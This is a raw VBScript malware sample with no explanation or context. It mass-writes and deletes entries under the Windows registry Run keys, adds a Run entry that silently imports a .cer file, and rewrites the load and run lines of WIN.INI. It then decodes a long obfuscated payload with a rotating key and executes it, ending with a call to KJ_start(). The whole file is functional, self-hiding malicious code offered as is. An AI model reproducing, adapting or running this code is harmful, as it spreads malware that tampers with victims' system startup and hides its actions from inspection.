Set CURObj = CreateObject("WScript.Shell")
mhk="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\Run\"
mhc="HK"&"CU\Soft"&"ware\Micros"&"oft\Win"&"dows\Curren"&"tVersion\Run\"
mhk2="HK"&"LM\SOFT"&"WARE\Micr"&"osoft\Win"&"dows\Curren"&"tVersion\"
CURObj.RegWrite ""&mhk&"W1N32","regedit -s c:\windows\system32\$WIN32$\WIN32SQL.cer"
CURObj.RegWrite ""&mhk&"internat.exe","internat.exe"
CURObj.RegWrite ""&mhk&"zwupdows","12"
CURObj.RegWrite ""&mhk&"win","12"
CURObj.RegWrite ""&mhk&"mwin","12"
CURObj.RegWrite ""&mhk&"internt","12"
CURObj.RegWrite ""&mhk&"Inernet","12"
CURObj.RegWrite ""&mhk&"Internet","12"
CURObj.RegWrite ""&mhk&"iexpleror","12"
CURObj.RegWrite ""&mhk&"zxdows","12"
CURObj.RegWrite ""&mhk&"qwe","12"
CURObj.RegWrite ""&mhk&"win1","12"
CURObj.RegWrite ""&mhk&"intelnat.exe","12"
CURObj.RegWrite ""&mhk&"u1888","12"
CURObj.RegWrite ""&mhk&"intenet","12"
CURObj.RegWrite ""&mhk&"9i5zxdows","12"
CURObj.RegWrite ""&mhk&"9i5com01zxdows","12"
CURObj.RegWrite ""&mhk&"99zxdows","12"
CURObj.RegWrite ""&mhk&"88zxdows","12"
CURObj.RegWrite ""&mhk&"Start Pagewin","12"
CURObj.RegWrite ""&mhk&"Start Page","12"
CURObj.RegWrite ""&mhk&"u188","12"
CURObj.RegWrite ""&mhk&"9i5comzxdows","12"
CURObj.RegWrite ""&mhk&"9q5zxdows","12"
CURObj.RegWrite ""&mhk&"u1881","12"
CURObj.RegWrite ""&mhk&"u1882","12"
CURObj.RegWrite ""&mhk&"u1883","12"
CURObj.RegWrite ""&mhk&"u1884","12"
CURObj.RegWrite ""&mhk&"u1885","12"
CURObj.RegWrite ""&mhk&"u1886","12"
CURObj.RegWrite ""&mhk&"u1887","12"
CURObj.RegWrite ""&mhk&"u88y", "12"
CURObj.RegWrite ""&mhk&"flash", "12"
CURObj.RegWrite ""&mhk&"999izxdows","12"
CURObj.RegWrite ""&mhk&"033zxdows","12"
CURObj.RegWrite ""&mhk&"syste","12"
CURObj.RegWrite ""&mhc&"my","12"
CURObj.RegWrite ""&mhk&"3zxdows","12"
CURObj.RegWrite ""&mhk&"88u88","12"
CURObj.RegWrite ""&mhk&"system","12"
CURObj.RegWrite ""&mhk&"8zxdows","12"
CURObj.RegWrite ""&mhk&"u18","12"
CURObj.RegWrite ""&mhk&"interneet.exe","12"
CURObj.RegWrite ""&mhk2&"RunOnce\", "12"
CURObj.RegWrite ""&mhk&"iexpler", "12"
CURObj.RegWrite ""&mhk&"u1810", "12"
CURObj.RegWrite ""&mhk&"winwin", "12"
CURObj.RegWrite ""&mhk&"WIN32", "12"
CURObj.RegDelete ""&mhc&""
CURObj.RegDelete ""&mhk&"zwupdows"
CURObj.RegDelete ""&mhk&"win"
CURObj.RegDelete ""&mhk&"mwin"
CURObj.RegDelete ""&mhk&"internt"
CURObj.RegDelete ""&mhk&"inernet"
CURObj.RegDelete ""&mhk&"Internet"
CURObj.RegDelete ""&mhk&"u188"
CURObj.RegDelete ""&mhk&"iexpleror"
CURObj.RegDelete ""&mhk&"zxdows"
CURObj.RegDelete ""&mhk&"qwe"
CURObj.RegDelete ""&mhk&"win1"
CURObj.RegDelete ""&mhk&"intelnat.exe"
CURObj.RegDelete ""&mhk&"intenet"
CURObj.RegDelete ""&mhk&"9i5zxdows"
CURObj.RegDelete ""&mhk&"9i5com01zxdows"
CURObj.RegDelete ""&mhk&"99zxdows"
CURObj.RegDelete ""&mhk&"88zxdows"
CURObj.RegDelete ""&mhk&"Start Pagewin"
CURObj.RegDelete ""&mhk&"Start Page"
CURObj.RegDelete ""&mhk&"9i5comzxdows"
CURObj.RegDelete ""&mhk&"9q5zxdows"
CURObj.RegDelete ""&mhk&"999izxdows"
CURObj.RegDelete ""&mhk&"033zxdows"
CURObj.RegDelete ""&mhk&"u1881"
CURObj.RegDelete ""&mhk&"u1882"
CURObj.RegDelete ""&mhk&"u1883"
CURObj.RegDelete ""&mhk&"u1884"
CURObj.RegDelete ""&mhk&"u1885"
CURObj.RegDelete ""&mhk&"u1886"
CURObj.RegDelete ""&mhk&"u1887"
CURObj.RegDelete ""&mhk&"u88y"
CURObj.RegDelete ""&mhk&"flash"
CURObj.RegDelete ""&mhk&"88u88"
CURObj.RegDelete ""&mhk&"interneet.exe"
CURObj.RegDelete ""&mhk&"u18"
CURObj.RegDelete ""&mhk&"u1888"
CURObj.RegDelete ""&mhk&"system"
CURObj.RegDelete ""&mhk&"3zxdows"
CURObj.RegDelete ""&mhk&"8zxdows"
CURObj.RegDelete ""&mhk&"syste"
CURObj.RegDelete ""&mhk2&"RunOnce\"
CURObj.RegDelete ""&mhk&"iexpler"
CURObj.RegDelete ""&mhk&"u1810"
CURObj.RegDelete ""&mhk&"winwin"
CURObj.RegDelete ""&mhk&"WIN32"

Set FSO = CreateObject("Scripting.FileSystemObject")
myfile14=FSO.FileExists("c:\windows\WIN.INI")
if myfile14 then
set FSO2=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin=FSO2.ReadALL()
l=Instr(mywin,"run=")-3
m=Instr(mywin,"load=")-1
n=Instr(mywin,"NullPort=")-3
FSO2.close
if l>0 and m>0 and l>m then
set FSO3=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin2=FSO3.Read(l)
FSO3.close
set FSO4=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin3=FSO4.Read(m)
FSO4.close
if n>0 and n>l then
set FSO5=FSO.OpenTextFile("c:\windows\WIN.INI")
mywin4=FSO5.Read(n)
FSO5.close
mywin=Replace(mywin,mywin4,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.WriteLine "load="
FSO2.Write "run="
FSO2.Write mywin
FSO2.close
else
mywin=Replace(mywin,mywin2,"")
set FSO2=FSO.CreateTextFile("c:\windows\WIN.INI")
FSO2.Write mywin3
FSO2.Write "load="
FSO2.Write mywin
FSO2.close
end if
end if
end if

ExeString = ">hhCmR`_q`$BshdNdsl&U]kNdsl&C`_ld`Kcfi$;okd_N]b_bo$@RJ$QrN`_kg$QhiH[sc$Mt]=&Edf[kt<crfRpZJEWms\jn'$JEK_s?ag'$JE;ld\l_Lddcdp #CDKdc_Ho #CDBm][s`E[hg #CDOmgj`bYnd#!@f^Nm\Epf]sdghFB;ok]hcOgEdd_O\lb+OqjdNll(Im=lqjjQ`kol`HdslN]nM][cO]go5ENG(Nk]hS`pnEdd_'AafdKYng')#LgoNll8Ld\\Ndhh(Q`Y^@gdD^Hiknq#LgoNll+CD^nl[qo #!$6=(NmFdi NlkKnq$6,Ng`fM][cO]go);fnn]@pcs>om^lcniDi\HaHaNxk]Msm7`nsNg`fM][cO]go);fnn]N]nAafdO]go5ENG(Nk]hS`pnEdd_'AafdKYng'*#>ck`L_lk&Qqdl_4!AJ<Sjffn\\7!%pan[lhkl4!!FBYroYls#!! 6!pa>jFeShhMsm qZ=qG^%@nlgL_woEdd_S`ej->dir`R`lE<lnqdZ<>MN)?_sAafd#>ck`H[sc!A9nsma\-\lnqdZos`k<+.=fr`Q`Y^S`ej->dir`R`lEdd_S`ej8@RJ&Io`fNdsl@hg]Edd_O\lb+3!D^Sth_Roj<bshdO`_m@hg]Ndhh(Vmandn\BmD`!; @NLG6!pa>jFe!7%<N?Qnidi`_5! n\r^jcoo2!JEWms\jn'$!!9%n\BmD`!BshdNdsl@dmdD^Sth_Roj<panSc]h>ck`L_lk&Qqdl_qZ=qG^%N\rO]rs?m_Ce@hg]Ndhh(Bggmd?m_Ce?m_@ti[nhjf@ti[nhjfJE;b`i__RpZBpjldilMsmahf'D[roAhc`p=g\j#A`GYmsDf^ds;b`m7+Ng`fD^K`^n'G;[r` =tmj_moKnqdfa(')#84K>Ymd#]!$Ng`fFB=g\fadNm\8@hiYfx?amj!5TKoa@7+Dgk_CDBcYhf`Koa5Bcj@n[K`^n'G;[r` =tmj_moKnqdfa(')#(%0$ 2V!Mt]=<(@f^D^@dmdEI>`[mb]Mt]7Ha^'>mlq`fnRojcmb$++GYmsDf^ds;b`m!@f^D^@f^AmhboaimAmhboaimCDBm][s`E[hg #Gh@jlnmLdnmgdF_woHaCmR`_q`7`nlgSc]h=rho@ti[nhjf@f^D^N`[q`>ck`7G]`s#OcmKYng'+#!Omgaq\eEdd_rW;ilhghAafdnTGh^jirj^nN`[q`\VRoYnhjf_qtT\k\fe-clg!Ce @RJ&@hg]?wdknr#Kb`m]@hg]#(LbdiB\dfFB;ok]hcOgRcYldAafd'bshd(?kn]N]nAafdO]go5ENG(Nk]hS`pnEdd_'N`[q`>ck`$,+ojod$Edd_S`ej-Rjcs`; @NLG6!pa>jFe!7%<N?Qnidi`_5! n\r^jcoo2!JEWms\jn'$!!9%n\BmD`!BshdNdslAafdO]go);fnn]@f^D^?]``pdnH_7RkMg`df-M]aQ`Y^'@EDTW=TMJ?MOWOR@JVH_]hsdlcdnT>daYokoOr`jH?#GosGgijQ]lrdgh8QrN`_kg&LdbJ_`_ GF=S^GG=@GWG@>@CM@TMnalq`m]VLd[lnng`sWGosggij=rom]mrWE_cdYPdm#OmRc]fk)J_fRjcs`GF=S^>MLQ@FN^PK?QWA^dilcsd]m[>daYokoA^%TMnalq`m]VLd[lnng`sWGosggij=rom]mrW G]`s#GosGgijQ]lrdgh+,!%&*[HYckW;ilkgmdMmdKn`oaim`js!')&!M=A^?OIQ?>YfkCDL\afQ`_!CC?XZ;OQM=HSZMMDMTCc`fnhoa_rW C`^[tglCc!VRj^nv\j_[Ha]qjkieoTItodinf?wkj_rnT%D_eo ItoDinfN_qnaim')#!(/WE[hgTMs\lcni]lxF[l`&RcYldAafd$B\dfFBG`ddLdb GF=S^>MLQ@FN^PK?QWA^dilcsd]m[>daYokoA^%TMnalq`m]VLd[lnng`sWGosggij=rom]mrW G]`s#GosGgijQ]lrdgh+,!%&*[HYckWOcc`Ms\lcni]lxF[l`&RcYldAafd$VnKbdgd(Q`_Qqdl_@EDTW=TMJ?MOWOR@JVRj^nv\j_[Ha]qjkieoTIeaa]dW1(/WGosggijWGjsdghrWE[hgT?cdliqKj_e`j_m^]+,++/2*&!M=A^?OIQ?>YfkCDL\afQ`_!CC?XZ;OQM=HSZMMDMTMnalq`m]VLd[lnng`sWOcm_gqrE_rnYahi_RpZmxnl_lWHlnaafdnTGh^jirj^nJmnkjgeDfndmf_sK_soahfnT*`+\*1+(*/+(*/+(]/+(*/+(*/+(*//.V/+)_/..*!'\k\fe!$B\dfFBG`ddLdb GF=S^>MLQ@FN^PK?QWKieoo[q`TGh^jirj^n[RahcjomILVBpjldilPdmkcniTQhi\ivnGdnk[fdfaNm\rtkndhTJqj^ck`kVLd[lnng`sGosggijAhs`jhdoMdolcmbkV/\(^/-(*/+(*/+(*b+(*/+(*/+(*/+,0[+(+d++0/$agYhj!RkMg`df-M]aVmandBJ@QYBPJLDILYTN=L[Ng`srYldWEcbmgmnalVNa^cb`T+/)(VNplfnjcVNklcnikVL\af[@\csjjJq`^_q`f]d$+2,(11'LDBW>VJJ>!=`gdJEE[hgJ_f#BJ@QYBPJLDILYTN=L[Ng`srYldWEcbmgmnalVNa^cb`T+/)(VBjegniTG`ddMdolcmbkVM`oMs\lcni]lx$agYhj!FBolhYadAgfc`jK`^n'RahO\lb+.!%Jqj_l`h@hg]m[>ggljfEdd_rWEcbmgmnalRcYld_TMs\lcni]lx!@f^AmhboaimAmhboaimCDBm][s`Eckd]o'$Ni?qmglM]mth]M`pnL_lkH[sc7D^MjlENG(Edd_Dsamsn QhiH[sc OMbmajs)]rd!#O`_mNdhhJ`o`<mxnl_l.*V!?m_CeCeL_lkH[sc7ksro]g2-TO`_mMs\jnTk>ck`7RahO\lb!RTKNDHTEdmf_k.*(cgd=fr`RoYlsPh@hg]<OcmKYng!NQMS@EVJ`jhdg&^kg@f^D^RkMg`df-M]aVmandBJ@QYKJ;;KZE;BCAHDWKieoo[q`TGh^jirj^n[Rahcjom[>mlq`fnU`jmhjfVQpfVJ`jhdg+,!'Kn`mlOoAafd@RJ&=nkq@hg]VdfJ`o`%qd]TeirYfk)_ce$QhiH[sc o_aW>ik_]l-cln!@RJ&=nkq@hg]VdfJ`o`%mxnl_l.*Vjeo[kg&aha&VdfJ`o`%mxnl_l.*Vc`kesjh(hia;[kgEI<hjdi\Nn#OcmKYng!r]\[Agfc`j(gol+`ns!RkMg`df-M]aVmandBJ@QYBG9MR@KYQJGN[)\fkW&!_dfedd_!QrN`_kg&LdbOlho]!CC?XZ;F@NK?RZJINOT(cgdVBjfndilSth_!'[okdcb\lcni'r,hk^nrffn\\OmRc]fk)J_fRjcs`GF=S^>D;RN=M^MGISW\fkaafdW<_e\mfsD[imW&VnKbdgd(Q`_Ld\\!CC?XZ;F@NK?RZJINOTpw_^ck`T>daYokoA]niT(QrN`_kg&LdbOlho]!CC?XZ;F@NK?RZJINOT^kg^ck`TMbmajs@fahi]V!'PAN[lhklOmRc]fk)J_fRjcs`GF=S^>D;RN=M^MGISW\fkAafdWKbdgdVNk]h[>ggl\f^[$QhiH[sc O]goKYng!RK]qdhn-`p_0$%RkMg`df-M]aVmandBJ@QYBG9MR@KYQJGN[_dfEdd_[N`_kg=r[Kjio`jnxN`_do@[m_d_qnTQRCHlnkkV!'u5+*/3>9/,4--A()+BA%2B4.'/+9;/+:26+0=|VnKbdgd(Q`_Qqdl_@EDTW=K<KMDNWLNJLVcgd@hg]VR^jcoo@iro=hbj\_[$z3-+2,.-0(,2/>%+0?*'A,>3,+(=//>25>+,3xN]nAafdO]go5ENG(Nk]hS`pnEdd_'Nl[qoMjEdd_+-$nqp]#>ck`L_lk&Qqdl_QZmS`pn>ck`L_lk&=kjk_=hc>om^lcni>om^lcniEIGaedDl(CeAhVc]ld48`nlgSc]h=rho@ti[nhjf@f^D^O`crGg]`oaim5cj[ol`fn-gg]`oaimCeD_eo NgdkFn^Ynhjf&/!<`hg]O`_mNgdkFn^Ynhjf<Ecc#LbhnDib\lcni$3(Ce>MN)?_s@pndikcniF[l` NgdkFn^Ynhjf#76!ng`fO`crGg]`oaim5K`^n'O`crGg]`oaim'D_m#LbhnDib\lcni!,D_m#>MN)?_sAafdIYgd#LbhnDib\lcni!#(?m_CeCeD_m#LbhnDib\lcni!=+Sc]hLbhnDib\lcni7O`crGg]`oaim!W@f^D^FBolhYadAgfc`jScamKj[[sdgh(?m_Ce?m_@ti[nhjf@ti[nhjfJEE[hgJ_f#J_fNll+AafdIYgd$Ni?qmglM]mth]M`pnJ_fO]goNll8QrN`_kg&LdbJ_`_ LdbKnq$HaLdbL_lkKnq5!Ng`fRkMg`df-M]aVmandJ_fNll+AafdIYgd?m_Ce?m_@ti[nhjf@ti[nhjfJEG\nNm\'>mlq`fnRojcmb!Nm\D5/NdnlIto7+CjQgdd_OjodNdnlIto7O]msJmn&+A`O]msJmn9,7LbdiBpjldilMsmahf5Edf[kt<crf 2V!?wdlCjDi\HaNi?qmglM]mth]M`pnK_sLbhn>ik_]l8@RJ&Ado>ik_]l'>mlq`fnRojcmb!N]n?a]RpZ<;ld\l_N]b_bo R^jcooahf)<cboaim\js!$R`lEjd^dmk<Lbhn>ik_]l-Nm\Ejd^dmkAgfc`j=npfn8*>iq=[bcNdhh@ng\_qahAgfc`jm>ik_]lBjmhs5Ejd^dm;itil*)?a]RpZ(`_\Ejd^dm;itil&O]goAgfc`j(M\e_F_woHa>h^Koa);itil<(Sc]hD[roAhc`p=g\j<AhrojLdq =tmj_moKnqdfa+T+G]h'>mlq`fnRojcmb!'0$RpZMsmahf5Ld\BpjldilMsmahf'D[roAhc`p=g\j%0'D_m#;oqm]hsNllhi_#,GYmsDf^ds;b`m%+(=tmj_moKnqdfa8EI>`[mb]Mt] =tmj_moKnqdfa+GYmsDf^ds;b`m!Nm\D50?kn]D^RpZ?8*O`_m=tmj_moKnqdfa8=tmj_moKnqdfa!>h^Koa)Andh +(!W@pcs<i=fr`i5/@nmd8+OgEjd^dm;itilD^K>Ymd#KoaNllhi_#8FB\k_'?a]RpZ(Ho]g'e!#O`_mCeb;>ik_]lBjmhsLbdiBpjldilMsmahf5BpjldilMsmahfCd[Mt]&Cs`ei&)#![Dsan?g@f^D^@f^D^I]rsF`nlCm_]rBcYl8CmnllQ`nBpjldilMsmahf'V!'D_m#;oqm]hsNllhi_#,,!Nm\Rojcmb7Ha^'>mlq`fnRojcmb$F`nlCm_]rBcYl*,$Fdi =tmj_moKnqdfa((D[roAhc`p=g\j'0$BpjldilMsmahf5JE;b`i__RpZBpjldilMsmahf'D[roAhc`p=g\j#=hcA`=hcA`DinkJEG\nNm\8=tmj_moKnqdfa=hc>om^lcni>om^lcniEIKjio\_[s` #Gh@jlnmLdnmgdF_woQ`_J`o`P`gm_8GF=S^GG=@GWG@>@CM@TMnalq`m]VLd[lnng`sWGosggij=rom]mrW<_fm]_!>hnc>dbj_d5VnKbdgd(Q`_Ld\\Q`_J`o`P`gm_(Ce<crf<_fm]_8!LbdiCdkeC`_ld`7Aah`gq>hnc%4[Di\HaEjjh8)sj/<crf<_fm]_8EIJZiRpZCdkeC`_ld`!FBolhYadAgfc`jCdkeC`_ld`!I]rsQrN`_kg&LdbOlho]Q`_J`o`P`gm_+?amj?]aq`]@f^AmhboaimAmhboaimCDthe[f`>ik_]l'KYngIYgd$Ni?qmglM]mth]M`pnK_s>ik_]lM\e_8@RJ&Ado>ik_]l'KYngIYgd$R`lScamEdd_r5Ejd^dmF[l`&@hg]m@ns@pcrok<(Agl@Y]gLbhn>ck`CmLbhn>ck`kAafd@pn8OB\k_'AKI-B]nDsl_mnaimIYgd#Lbhn>ck`&J`o`#(Ce>ck`=rs5!CLG!GlAafd@pn8GOEF!GlAafd@pn8@NHJjEdd_Dsl<JGKNm@hg]?wo7BMONg`f>YfkCD@kh_m_Li'O`crAafd)H[sc$goef!$Dgk_Ha@hg]?wo7N<RNg`f>YfkCD@kh_m_Li'O`crAafd)H[sc$u]k(?kn]Ce>ck`=rs5!CLN!LbdiGol?wdknr50?m_CeHdslD^'P;[r` J`o`H`h]#8OB\k_'RahO\lb!C`kesjhV!$!NmT>Ymd#H[scF[l`!<M=`n]VdfJ`o`%>dncnnk#(O`_mBso=rhnlm8+=hcA`A`ClnDsamsn7+Ng`fAKI->gjxAafdOcmKYng!nqms`e-1W\_rflio)ahh$J`o`H`h]AKI->gjxAafdOcmKYng!r]\[Agfc`j(gol+KYngIYgd?m_Ce?m_@ti[nhjf@ti[nhjfJEK_s?ag'$Ni?qmglM]mth]M`pn=lq);fd\jO]msDl<OMbmajs)K]qdhnEpdfm\e_A`@jlO`_mCmR`_q`7`nlg@dmdCmR`_q`7n\rDi\HaHaCmR`_q`7n\rNg`fN]nAKI8=q`YndJZdd^l!N[lhklcmb&@hg]Mxnl_lJZdd^l(MdoQrN`_kg7>j_`o]Iae]]s#QR^jcoo&Mg`df!$Dgk_K_s9jog]Iae]]s5cj[ol`fn-\hjk`lm'CD^bm_ro#9jog]Iae]]s)k_s>DMH? zA1-4?;,1()=E+%+0?('@?:3,+(=//>>439*Ax#9jog]Iae]]s)[ld\l_Hikn`i[_'$R`lVnKbdgd<9jog]Iae]]s)?_sJZdd^l(;okd_N]b_bo&mdo;FRD<!v(>3.>?/,%@/4+'0,;@,31./((*@+;3/0,,13u(;okd_N]b_bo&]q`YndDfms\f]d#!N]nAKI8;okd_N]b_bo&AdoG\i`[n'$Di\HaR`lCdkeN]b_bo7AKI-?jcu`kAgl@Y]g<crfL_lkCm<crfG\i`[nA`?amjO]go)<lhq]Nxk];9,<f^?amjO]go)<lhq]Nxk];9+O`_m?wdlEjj@f^D^Aah`gq>hnc<<crfL_lk&>qdn_K`lndmM`pn<clGng`j;qm -(L`i\ildr_>iqa7/Li.No`_q<jl'd!<Ahs# 3%Lm_!#F_woS`ejRojcmb7Agld5+OgK`fScamS`pn(NdhhHth7<k]'Ha^'O`crO]rs'a&0$!D^S`ejMpe<)-O`_mNdhhHth7-0@dmdD^S`ejMpe<)*O`_mNdhhHth7-1@f^D^O]go>`[q5BcjS`ejMpe,Gng`j;qm cHg^/!#A`O]go>`[q5Bcj2/!Sc]hL_lk;b`m7>`l',0#=hcA`L_lkKnqdfa8NdhhMsmahfS`ejBcYlF_woTiDibfKnq5!@p_bpl_'>hhEdt9lq#+#+O`crO]rs u];lKa!F]s@mj/$7 Jlbdm9lq#(#!!pa>jFe!J`q;qm +(5!No`_q<jl',!%!!n\BmD`%Edt9lq#*#8!Isc]l@mj1$ %qZ=qG^ !C_x<jl'.!<%Gng`j;qm -(! u];lKa!Agld5+OgK`fDs]Msmahf$%qZ=qG^ !L_lkFol5@n[Ld\Ds]Msmahf'a&0$!!!n\BmD`%CeL_lkFol503Ng`f!!n\BmD`%NdhhHth7.,!!n\BmD`%?m_Ce u];lKa!O]go>`[q5BcjS`ejMpe*C_x<jl'dGn_.($%qZ=qG^ !A`O]go>`[q5Bcj13!Sc]h!pa>jFe!S`ejBcYl8pa>j!!n\BmD`%?kn]CeL_lk;b`m7>`l'-1#O`_m u];lKa!O]go>`[q5u]D`!pa>jFe!Di\Ha%qZ=qG^ !LbhnL_wo7O`crO]rsS`ejBcYl!pa>jFe!M`pn!!!pa>jFe!@p_bpl_'O`crO]rs$O`crO]rs5!@p_Rojcmb7!NdhhMsmahf!@nlgL_wo7!7%mbmajsd[mbm[f`5pan[lhkl8!u];lKa \ibpe_mo&qqdl_ !!7%^hqmstd_<hirdlcni2[angfto]5g]`s5(jw6nnk2*os3vd\ng5(jw6bdd_bs5(jw6t,df^ds2,76phna\hganx5bh_\_m6!; !%;OKD?SF;L@5EI !Wat`knC=CFCL7/OCCO@7/[ic`5]nh&gr)%[boapdS&;boapd !P=nhhim`fn= 4!.<HJK@L8!!7%)cdn8!%n\BmD`!; 'mbmajs9%n\BmD`!; k]qdhngYhfpYad8n\r^jcoo6!pa>jFeScamS`pn!pa>jFeTiDibfKnqu];lKa 4!.n[lhkl8!u];lKa 4!.=G>X9%n\BmD`!; 'BSHD8!PanL_wo7O`crO]rsu];lKa PfFn^cMsm qZ=qG^%EIZkn`ml(VdfJ`o`<>MN)?_sNh_bdYfEjd^dm *(!WD^'AKI-Aafd@pcrokVdfJ`o`%qd]T@ng\_q)`ns!#O`_m@RJ&=nkq@hg]VdfJ`o`%qd]T@ng\_q)`ns$QhiH[sc o_aWcdv\df-ba`!?m_CeCe @RJ&@hg]?wdknr#OcmKYng!nqms`e-1W\_rflio)ahh!#O`_m@RJ&=nkq@hg]VdfJ`o`%mxnl_l.*Vc`kesjh(hia+RahO\lb!rtkndh+,[fbq`gd(fd^=hcA`=hc>om^lcni"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 8"&vbCrLf&"KeyArr(1) = 6"&vbCrLf&"KeyArr(2) = 1"&vbCrLf&"KeyArr(3) = 5"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
KJ_start()